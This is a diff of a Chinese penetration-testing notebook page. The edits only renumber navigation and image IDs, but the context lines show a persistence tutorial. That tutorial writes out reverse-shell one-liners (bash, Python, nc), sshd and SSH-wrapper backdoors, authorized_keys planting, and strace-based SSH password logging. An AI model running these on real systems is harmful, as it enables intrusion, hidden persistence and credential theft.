@@ -1647,12 +1647,12 @@
             
         </li>
     
-        <li class="chapter " data-level="1.2.2.13" data-path="../02.WEB漏洞/13.列目录漏洞/">
+        <li class="chapter " data-level="1.2.2.13" data-path="../02.WEB漏洞/13.代码注入/">
             
-                <a href="../02.WEB漏洞/13.列目录漏洞/">
+                <a href="../02.WEB漏洞/13.代码注入/">
             
                     
-                    13.列目录漏洞
+                    13.代码注入
             
                 </a>
             
@@ -1686,12 +1686,12 @@
             
         </li>
     
-        <li class="chapter " data-level="1.2.2.16" data-path="../02.WEB漏洞/16.CSV注入/">
+        <li class="chapter " data-level="1.2.2.16" data-path="../02.WEB漏洞/16.CORS跨域数据劫持/">
             
-                <a href="../02.WEB漏洞/16.CSV注入/">
+                <a href="../02.WEB漏洞/16.CORS跨域数据劫持/">
             
                     
-                    16.CSV注入
+                    16.CORS跨域数据劫持
             
                 </a>
             
@@ -1699,12 +1699,12 @@
             
         </li>
     
-        <li class="chapter " data-level="1.2.2.17" data-path="../02.WEB漏洞/17.XPATH注入/">
+        <li class="chapter " data-level="1.2.2.17" data-path="../02.WEB漏洞/17.CSV注入/">
             
-                <a href="../02.WEB漏洞/17.XPATH注入/">
+                <a href="../02.WEB漏洞/17.CSV注入/">
             
                     
-                    17.XPATH注入
+                    17.CSV注入
             
                 </a>
             
@@ -1783,6 +1783,32 @@
             
                     
                     23.子域名接管
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.24" data-path="../02.WEB漏洞/24.列目录漏洞/">
+            
+                <a href="../02.WEB漏洞/24.列目录漏洞/">
+            
+                    
+                    24.列目录漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.25" data-path="../02.WEB漏洞/25.XPATH注入/">
+            
+                <a href="../02.WEB漏洞/25.XPATH注入/">
+            
+                    
+                    25.XPATH注入
             
                 </a>
             
@@ -4522,7 +4548,7 @@
 <li>&#x53C2;&#x6570;&#x6DF7;&#x6DC6;&#x62E6;&#x622A;rm</li>
 <li>&#x5220;&#x9664;/&#x9690;&#x85CF;&#x5386;&#x53F2;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;</li>
 </ul>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234181991067624646.jpg" data-lightbox="9f5374d3-6f6b-478e-98f8-8fdb20e46143" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234181991067624646.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234181991067624646.jpg" data-lightbox="e29eb320-6354-4db1-b672-ac23fc61aebd" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158234181991067624646.jpg" alt=""></a></p>
 <p>&#x62FF;&#x5230;&#x673A;&#x5668;&#x540E;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x4E00;&#x4E0B;&#x6709;&#x6CA1;&#x6709;&#x76F8;&#x5173;&#x7A0B;&#x5E8F;&#xFF0C;&#x53CD;&#x5F39;shell&#x7B49;&#x8FDB;&#x7A0B;&#x80FD;&#x591F;&#x88AB;&#x67E5;&#x5230;&#xFF0C;&#x8FD9;&#x6761;&#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x7B80;&#x5355;&#x7684;kill&#x6389;&#x4E00;&#x4E9B;&#x5E38;&#x89C1;&#x6076;&#x610F;&#x7A0B;&#x5E8F;&#x3002;</p>
 <p>&#x6279;&#x91CF;kill&#x53EF;&#x7591;&#x8FDB;&#x7A0B;&#xFF1A;</p>
 <pre class="language-"><code class="lang-bash"><span class="token function">ps</span> -ef <span class="token operator">|</span><span class="token function">grep</span> <span class="token string">&quot;python&quot;</span> <span class="token operator">|</span><span class="token function">awk</span> <span class="token string">&apos;{print <span class="token variable">$2</span>}&apos;</span><span class="token operator">|</span><span class="token function">xargs</span> <span class="token function">kill</span> -9
@@ -4533,17 +4559,17 @@
 <p>&#x5173;&#x4E8E;&#x53CD;&#x5F39;&#x539F;&#x7406;&#xFF0C;&#x548C;&#x6BCF;&#x4E00;&#x6B65;&#x7684;&#x6570;&#x636E;&#x6D41;&#x5411;&#x5728;&#x7F51;&#x4E0A;&#x90FD;&#x6709;&#x6587;&#x7AE0;&#xFF0C;&#x5C31;&#x4E0D;&#x590D;&#x5236;&#x4E86;&#x3002;&#x8FD9;&#x91CC;&#x53EA;&#x662F;&#x7528;&#x6765;&#x603B;&#x7ED3;&#x4E0B;&#x5E38;&#x89C4;&#x53CD;&#x5F39;shell&#x7684;&#x7528;&#x6CD5;&#xFF0C;&#x987A;&#x4FBF;&#x8BF4;&#x4E0B;&#x4F18;&#x70B9;&#x7F3A;&#x70B9;&#x3002;</p>
 <pre class="language-"><code class="lang-bash"><span class="token function">bash</span> -i <span class="token operator">&gt;&amp;</span> /dev/tcp/127.0.0.1/6666 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
 </code></pre>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574676129755477.jpg" data-lightbox="3f915dad-9518-487e-a5c4-4a2f434436e0" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574676129755477.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574676129755477.jpg" data-lightbox="07aacad3-c168-4f11-b790-45e1658ff6f9" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574676129755477.jpg" alt=""></a></p>
 <p><strong>&#x4F18;&#x70B9;&#xFF1A;</strong>&#x5728;&#x5927;&#x591A;&#x6570;Liunx&#x7CFB;&#x7EDF;&#x4E0A;&#x90FD;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;</p>
 <p><strong>&#x7F3A;&#x70B9;&#xFF1A;</strong>&#x5728;&#x8DEF;&#x7531;&#x5668;&#x7CFB;&#x7EDF;&#x4E2D;&#x4E0D;&#x5B58;&#x5728;bash&#xFF0C;&#x5B58;&#x5728;&#x7B26;&#x53F7;&gt;&#x3001;&amp; &#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4E2D;&#x6216;&#x8005;&#x5BF9;&#x7B26;&#x53F7;&#x8F6C;&#x4E49;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x5C31;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x53CD;&#x5F39;&#x4E86;&#x3002;</p>
 <pre class="language-"><code class="lang-bash">python -c <span class="token string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect<span class="token variable"><span class="token punctuation">((</span>&apos;<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>&apos;<span class="token punctuation">,</span><span class="token number">6666</span><span class="token punctuation">))</span></span>;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&apos;/bin/bash&apos;,&apos;-i&apos;]);&quot;</span>
 </code></pre>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574740847872744.jpg" data-lightbox="b44b94dc-2854-472c-9af7-2621a200c534" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574740847872744.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574740847872744.jpg" data-lightbox="6ebcdc58-058a-439a-ac19-a5c00377aa1a" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574740847872744.jpg" alt=""></a></p>
 <p><strong>&#x4F18;&#x70B9;&#xFF1A;</strong>&#x5728;&#x5B89;&#x88C5;&#x4E86;python&#x4E0A;&#x7684;linux&#x90FD;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF0C;&#x539F;&#x7406;&#x8FD8;&#x662F;&#x5C06;&#x6807;&#x51C6;&#x8F93;&#x5165;&#x3001;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#x3001;&#x6807;&#x51C6;&#x9519;&#x8BEF;&#x8F93;&#x51FA;&#x91CD;&#x5B9A;&#x5411;&#x5230;&#x8FDC;&#x7A0B;&#x3002;&#x4F7F;&#x7528;bash&#x4EA4;&#x4E92;&#x6A21;&#x5F0F;&#x542F;&#x52A8;&#x3002;</p>
 <p><strong>&#x7F3A;&#x70B9;&#xFF1A;</strong>&#x5728;&#x8DEF;&#x7531;&#x5668;&#x7CFB;&#x7EDF;&#x4E2D;&#x4E0D;&#x5B58;&#x5728;bash&#x6216;&#x8005;&#x9609;&#x5272;&#x4E86;python&#x5E93;&#xFF0C;&#x5B58;&#x5728;&#x7B26;&#x53F7;&gt;&#x3001;&amp; &#x3001;&apos;&#x3001;&quot;&#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4E2D;&#x6216;&#x8005;&#x5BF9;&#x7B26;&#x53F7;&#x8F6C;&#x4E49;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x5C31;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x53CD;&#x5F39;&#x4E86;&#x3002;&#x5355;&#x53CC;&#x5F15;&#x53F7;&#x4E5F;&#x4F1A;&#x5BFC;&#x81F4;&#x95ED;&#x5408;&#x95EE;&#x9898;&#x3002;</p>
 <pre class="language-"><code class="lang-bash"><span class="token function">nc</span> -e /bin/bash <span class="token number">127.0</span>.0.1 <span class="token number">6666</span>
 </code></pre>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657475288565542.jpg" data-lightbox="3a271351-41c6-49b3-bb3c-75d300956ad6" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657475288565542.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657475288565542.jpg" data-lightbox="4a86e4e8-2a3c-4b75-8de7-9d3920127a09" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657475288565542.jpg" alt=""></a></p>
 <p>&#x4E00;&#x822C;Netcat&#x6709;&#x4E24;&#x4E2A;&#x7248;&#x672C;&#xFF0C;&#x4E00;&#x4E2A;&#x7248;&#x672C;&#x662F;&#x4E0D;&#x63D0;&#x4F9B;&#x53CD;&#x5411;&#x8FDE;&#x63A5;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x5168;&#x529F;&#x80FD;&#x7248;&#x672C;&#x3002;&#x8FD9;&#x4E24;&#x8005;&#x7684;&#x533A;&#x522B;&#x5C31;&#x662F;&#x662F;&#x5426;&#x5E26;-e&#x53C2;&#x6570;&#xFF0C;&#x53EA;&#x6709;&#x5E26;-e&#x53C2;&#x6570;&#x7684;&#x7248;&#x672C;&#x624D;&#x652F;&#x6301;&#x53CD;&#x5411;&#x8FDE;&#x63A5;&#x3002;ubuntu 18.04&#x5B89;&#x88C5;&#x7684;&#x662F;&#x4E0D;&#x63D0;&#x4F9B;&#x53CD;&#x5411;&#x94FE;&#x63A5;&#x7684;&#x7248;&#x672C;&#x3002;</p>
 <pre class="language-"><code class="lang-bash"><span class="token function">wget</span> https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz
 <span class="token function">tar</span> -zxvf netcat-0.7.1.tar.gz -C /usr/local
@@ -4553,13 +4579,13 @@
 ./configure
 <span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span>
 </code></pre>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574763842582273.jpg" data-lightbox="929cf8b5-3f8d-40f8-a72d-7416229115af" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574763842582273.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574763842582273.jpg" data-lightbox="ee6e68a3-b29b-4801-9efa-3153e68096dc" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574763842582273.jpg" alt=""></a></p>
 <p><strong>&#x4F18;&#x70B9;&#xFF1A;</strong>&#x76F4;&#x63A5;&#x53CD;&#x5F39;&#xFF0C;&#x6CA1;&#x6709;&#x591A;&#x4F59;&#x7684;&#x7B26;&#x53F7;&#x3002;</p>
 <p><strong>&#x7F3A;&#x70B9;&#xFF1A;</strong>&#x7CFB;&#x7EDF;apt&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x7684;&#x90FD;&#x662F;&#x4E0D;&#x63D0;&#x4F9B;&#x53CD;&#x5411;&#x94FE;&#x63A5;&#x7684;&#x7248;&#x672C;&#xFF0C;&#x9700;&#x8981;&#x81EA;&#x5DF1;&#x4E0A;&#x4F20;&#x7F16;&#x8BD1;&#x540E;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x7248;&#x672C;&#x3002;</p>
 <p>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;1:</p>
 <pre class="language-"><code class="lang-bash"><span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">6666</span><span class="token operator">|</span>/bin/bash<span class="token operator">|</span><span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">7777</span>
 </code></pre>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574781857377856.jpg" data-lightbox="bf976a33-c156-4f22-b265-b8f2cb1a28c9" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574781857377856.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574781857377856.jpg" data-lightbox="6312d778-1a5c-40da-82e8-0a8fcdab96b8" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574781857377856.jpg" alt=""></a></p>
 <p>&#x5229;&#x7528;6666&#x7AEF;&#x53E3;&#x4F20;&#x5165;&#x5185;&#x5BB9;&#x4EA4;&#x7ED9;bash&#x6267;&#x884C;&#xFF0C;&#x518D;&#x5C06;&#x5185;&#x5BB9;&#x4ECE;7777&#x9001;&#x51FA;&#x53BB;&#xFF0C;&#x7BA1;&#x9053;&#x7B26;&#x7684;&#x7528;&#x6CD5;&#x3002;&#x53EF;&#x4EE5;&#x5728;&#x9609;&#x5272;&#x529F;&#x80FD;&#x7684;nc&#x4E0A;&#x4F7F;&#x7528;&#x3002;</p>
 <p>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;2: (&#x9488;&#x5BF9;&#x67D0;&#x4E9B;mips&#x67B6;&#x6784;&#x7684;&#x8DEF;&#x7531;&#x5668;&amp;busybox&#x7EC8;&#x7AEF;&#x7684;&#x7CFB;&#x7EDF;)&#xFF1A;</p>
 <pre class="language-"><code class="lang-bash"><span class="token comment"># &#x9510;&#x6377;</span>
@@ -4568,7 +4594,7 @@
 <span class="token comment"># &#x98DE;&#x9C7C;&#x661F;&#x53CD;&#x5F39;shell</span>
 <span class="token function">mkfifo</span> /tmp/backpipe1 <span class="token operator">|</span> /bin/sh <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/tmp/backpipe1 <span class="token operator">|</span> /bin/busybox <span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">6666</span> <span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>/tmp/backpipe1
 </code></pre>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657479487222131.jpg" data-lightbox="3e71fd62-8339-46e4-9680-ebff9698d8ca" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657479487222131.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657479487222131.jpg" data-lightbox="efb5146b-4158-42c1-b03c-f99c6cff276f" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657479487222131.jpg" alt=""></a></p>
 <h2 id="ssh&#x540E;&#x95E8;"><a name="ssh&#x540E;&#x95E8;" class="anchor-navigation-ex-anchor" href="#ssh&#x540E;&#x95E8;"><i class="fa fa-link" aria-hidden="true"></i></a>1.3. SSH&#x540E;&#x95E8;</h2>
 <h3 id="ssh-wrapper"><a name="ssh-wrapper" class="anchor-navigation-ex-anchor" href="#ssh-wrapper"><i class="fa fa-link" aria-hidden="true"></i></a>1.3.1. SSH wrapper</h3>
 <p>&#x5224;&#x65AD;&#x8FDE;&#x63A5;&#x6765;&#x6E90;&#x7AEF;&#x53E3;&#xFF0C;&#x5C06;&#x6076;&#x610F;&#x7AEF;&#x53E3;&#x6765;&#x6E90;&#x8BBF;&#x95EE;&#x4F20;&#x8F93;&#x5185;&#x5BB9;&#x91CD;&#x5B9A;&#x5411;&#x5230;/bin/sh&#x4E2D;&#x3002;</p>
@@ -4583,14 +4609,14 @@ exec<span class="token punctuation">{</span><span class="token string">&quot;/us
 <p>&#x5728;&#x672C;&#x673A;&#x6267;&#x884C;</p>
 <pre class="language-"><code class="lang-bash">socat STDIO TCP4:127.0.0.1:22,sourceport<span class="token operator">=</span><span class="token number">19265</span>
 </code></pre>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574815858279468.jpg" data-lightbox="3a98165e-1ec2-4243-95ee-695844e52df3" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574815858279468.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574815858279468.jpg" data-lightbox="fb895a68-2f04-4523-8afa-a87b2fbb2ac3" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574815858279468.jpg" alt=""></a></p>
 <p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6211;&#x5229;&#x7528;socat&#x9650;&#x5236;&#x4E86;&#x672C;&#x5730;&#x7AEF;&#x53E3;19526&#x8BBF;&#x95EE;server&#x7684;22&#x7AEF;&#x53E3;&#x53CD;&#x56DE;&#x4E00;&#x4E2A;sh&#x7A97;&#x3002;</p>
 <p>&#x4FEE;&#x6539;&#x7AEF;&#x53E3;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;..LF</p>
 <pre class="language-"><code class="lang-bash"><span class="token function">import</span> struct
 buffer <span class="token operator">=</span> struct.pack<span class="token punctuation">(</span><span class="token string">&apos;&gt;I6&apos;</span>,19526<span class="token punctuation">)</span>
 print repr<span class="token punctuation">(</span>buffer<span class="token punctuation">)</span>
 </code></pre>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574827841073143.jpg" data-lightbox="ba45c742-4cd2-4872-b480-076027befb40" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574827841073143.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574827841073143.jpg" data-lightbox="d0f28348-9c21-467b-8330-a584bbc5b664" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574827841073143.jpg" alt=""></a></p>
 <p><strong>&#x4F18;&#x70B9;&#xFF1A;</strong></p>
 <p>1&#x3001;&#x5728;&#x65E0;&#x8FDE;&#x63A5;&#x540E;&#x95E8;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7BA1;&#x7406;&#x5458;&#x662F;&#x770B;&#x4E0D;&#x5230;&#x7AEF;&#x53E3;&#x548C;&#x8FDB;&#x7A0B;&#x7684;&#xFF0C;last&#x4E5F;&#x67E5;&#x4E0D;&#x5230;&#x767B;&#x9646;&#x3002;</p>
 <p>2&#x3001;&#x5728;&#x9488;&#x5BF9;&#x8FB9;&#x754C;&#x8BBE;&#x5907;&#x51FA;&#x7F51;&#xFF0C;&#x5185;&#x7F51;linux&#x670D;&#x52A1;&#x5668;&#x672A;&#x51FA;&#x7F51;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7559;&#x8FD9;&#x4E2A;&#x540E;&#x95E8;&#x53EF;&#x4EE5;&#x968F;&#x65F6;&#x7BA1;&#x7406;&#x5185;&#x7F51;linux&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x8FD8;&#x4E0D;&#x4F1A;&#x7559;&#x4E0B;&#x6587;&#x4EF6;&#x548C;&#x6076;&#x610F;&#x7F51;&#x7EDC;&#x8FDE;&#x63A5;&#x8BB0;&#x5F55;&#x3002;</p>
@@ -4599,28 +4625,28 @@ print repr<span class="token punctuation">(</span>buffer<span class="token punct
 <pre class="language-"><code class="lang-bash"><span class="token function">ln</span> -sf /usr/sbin/sshd /tmp/su
 /tmp/su -oPort<span class="token operator">=</span><span class="token number">888</span>
 </code></pre>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574842856249462.jpg" data-lightbox="6fc3b450-d29b-4b80-88fd-b622701b7c06" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574842856249462.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574842856249462.jpg" data-lightbox="c52676b8-0079-4ab5-9078-7785ce821b16" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574842856249462.jpg" alt=""></a></p>
 <p><strong>&#x4F18;&#x70B9;&#xFF1A;</strong>&#x80FD;&#x591F;&#x7ED5;&#x8FC7;&#x4E00;&#x4E9B;&#x7F51;&#x7EDC;&#x8BBE;&#x5907;&#x7684;&#x5B89;&#x5168;&#x6D41;&#x91CF;&#x76D1;&#x6D4B;</p>
 <p><strong>&#x7F3A;&#x70B9;&#xFF1A;</strong>&#x672C;&#x5730;&#x5728;&#x67E5;&#x770B;&#x76D1;&#x542C;&#x7AEF;&#x53E3;&#x65F6;&#x4F1A;&#x66B4;&#x9732;&#x7AEF;&#x53E3;&#xFF0C;&#x5EFA;&#x8BAE;&#x8BBE;&#x7F6E;&#x6210;8081&#xFF0C;8080&#x7B49;&#x7AEF;&#x53E3;&#x3002;</p>
 <h3 id="ssh-&#x516C;&#x94A5;&#x514D;&#x5BC6;&#x767B;&#x9646;"><a name="ssh-&#x516C;&#x94A5;&#x514D;&#x5BC6;&#x767B;&#x9646;" class="anchor-navigation-ex-anchor" href="#ssh-&#x516C;&#x94A5;&#x514D;&#x5BC6;&#x767B;&#x9646;"><i class="fa fa-link" aria-hidden="true"></i></a>1.3.3. SSH &#x516C;&#x94A5;&#x514D;&#x5BC6;&#x767B;&#x9646;</h3>
 <p><code>ssh-keygen -t rsa</code>&#x751F;&#x6210;&#x516C;&#x94A5;</p>
 <p>&#x5C06;<code>id_rsa.pub</code>&#x5185;&#x5BB9;&#x653E;&#x5230;&#x76EE;&#x6807;<code>.ssh/authorized_keys</code>&#x91CC;</p>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574857862523006.jpg" data-lightbox="6829eacb-a75e-4c46-964b-dd57784985fd" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574857862523006.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574857862523006.jpg" data-lightbox="a59686a9-01c1-4730-b101-eb8d8edda163" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574857862523006.jpg" alt=""></a></p>
 <p>&#x8FD9;&#x4E2A;&#x662F;&#x8001;&#x751F;&#x5E38;&#x8C08;&#x7684;&#x516C;&#x94A5;&#x514D;&#x767B;&#x9646;&#xFF0C;&#x8FD9;&#x79CD;&#x7528;&#x6CD5;&#x4E0D;&#x53EA;&#x662F;&#x7528;&#x5728;&#x7559;&#x540E;&#x95E8;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x5728;&#x4E00;&#x4E9B;&#x7279;&#x6B8A;&#x60C5;&#x51B5;&#x4E0B;&#x83B7;&#x53D6;&#x4E00;&#x4E2A;&#x4EA4;&#x4E92;&#x7684;shell&#xFF0C;&#x5982;struts&#x5199;&#x5165;&#x516C;&#x94A5;&#xFF0C;oracle&#x5199;&#x5165;&#x516C;&#x94A5;&#x8FDE;&#x63A5;&#x7B49;&#x60C5;&#x666F;&#x3002;</p>
 <h3 id="ssh-keylogger"><a name="ssh-keylogger" class="anchor-navigation-ex-anchor" href="#ssh-keylogger"><i class="fa fa-link" aria-hidden="true"></i></a>1.3.4. SSH Keylogger</h3>
 <p>&#x5229;&#x7528;strace&#x7CFB;&#x7EDF;&#x8C03;&#x8BD5;&#x5DE5;&#x5177;&#x83B7;&#x53D6;ssh&#x7684;&#x8BFB;&#x5199;&#x8FDE;&#x63A5;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4EE5;&#x8FBE;&#x5230;&#x6293;&#x53D6;&#x7BA1;&#x7406;&#x5458;&#x767B;&#x9646;&#x5176;&#x4ED6;&#x673A;&#x5668;&#x7684;&#x660E;&#x6587;&#x5BC6;&#x7801;&#x7684;&#x4F5C;&#x7528;&#x3002;</p>
 <p>&#x5728;&#x5F53;&#x524D;&#x7528;&#x6237;&#x7684;.bashrc&#x91CC;&#x65B0;&#x5EFA;&#x4E00;&#x6761;alias&#x3001;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x6293;&#x53D6;&#x4ED6;&#x767B;&#x9646;&#x5176;&#x4ED6;&#x673A;&#x5668;&#x7684;ssh&#x5BC6;&#x7801;&#x3002;&#x7B97;&#x662F;alias&#x540E;&#x95E8;&#x3002;&#x540E;&#x9762;&#x4F1A;&#x5728;&#x8BB2;&#x4E00;&#x4E0B;alias&#x540E;&#x95E8;&#x3002;</p>
 <pre class="language-"><code class="lang-bash"><span class="token builtin class-name">alias</span> <span class="token assign-left variable">ssh</span><span class="token operator">=</span><span class="token string">&apos;strace -o /tmp/sshpwd-<span class="token variable"><span class="token variable">`</span><span class="token function">date</span> <span class="token string">&apos;+%d%h%m%s&apos;</span><span class="token variable">`</span></span>.log -e read,write,connect -s2048 ssh&apos;</span>
 </code></pre>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657489882315516.jpg" data-lightbox="35100f87-0947-4437-a3ba-76cc932c8dfd" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657489882315516.jpg" alt=""></a></p>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574911857635848.jpg" data-lightbox="b6867484-ab89-45e6-bcde-86140ac3c5ff" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574911857635848.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657489882315516.jpg" data-lightbox="a27e824c-b978-4400-8c47-ef338de7c961" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657489882315516.jpg" alt=""></a></p>
+<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574911857635848.jpg" data-lightbox="a296d894-15d5-45fe-8bb9-7b2738240c53" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/158236574911857635848.jpg" alt=""></a></p>
 <h3 id="strace&#x76D1;&#x542C;ssh&#x6765;&#x6E90;&#x6D41;&#x91CF;"><a name="strace&#x76D1;&#x542C;ssh&#x6765;&#x6E90;&#x6D41;&#x91CF;" class="anchor-navigation-ex-anchor" href="#strace&#x76D1;&#x542C;ssh&#x6765;&#x6E90;&#x6D41;&#x91CF;"><i class="fa fa-link" aria-hidden="true"></i></a>1.3.5. strace&#x76D1;&#x542C;ssh&#x6765;&#x6E90;&#x6D41;&#x91CF;</h3>
 <p>&#x4E0D;&#x53EA;&#x662F;&#x53EF;&#x4EE5;&#x76D1;&#x542C;&#x8FDE;&#x63A5;&#x4ED6;&#x4EBA;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6293;&#x5230;&#x522B;&#x4EBA;&#x8FDE;&#x5165;&#x7684;&#x5BC6;&#x7801;&#x3002;&#x5E94;&#x7528;&#x573A;&#x666F;&#x5982;&#xFF1A;&#x901A;&#x8FC7;&#x6F0F;&#x6D1E;&#x83B7;&#x53D6;root&#x6743;&#x9650;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x77E5;&#x9053;&#x660E;&#x6587;&#x5BC6;&#x7801;&#x5728;&#x6A2A;&#x5411;&#x6269;&#x5C55;&#x4E2D;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x3002;</p>
 <p>&#x4E4B;&#x524D;&#x6709;&#x7528;&#x522B;&#x540D;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x6293;&#x53D6;&#x767B;&#x9646;&#x5176;&#x4ED6;&#x673A;&#x5668;&#x65F6;&#x7684;&#x5BC6;&#x7801;&#x3001;&#x540C;&#x6837;&#x4E5F;&#x53EF;&#x4EE5;&#x5229;&#x7528;strace&#x6765;&#x76D1;&#x542C;&#x767B;&#x9646;&#x672C;&#x5730;&#x7684;sshd&#x6D41;&#x91CF;&#x3002;</p>
 <pre class="language-"><code class="lang-bash"><span class="token function">ps</span> -ef <span class="token operator">|</span> <span class="token function">grep</span> sshd <span class="token comment">#&#x7236;&#x8FDB;&#x7A0B;PID</span>
 </code></pre>
-<p><a href="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657493082746662.jpg" data-lightbox="33433033-5837-4f7b-a90a-175816825ddb" data-title=""><img src="&#x6743;&#x9650;&#x7EF4;&#x6301;.assets/15823657493082746662.jpg" alt=""></a></p>
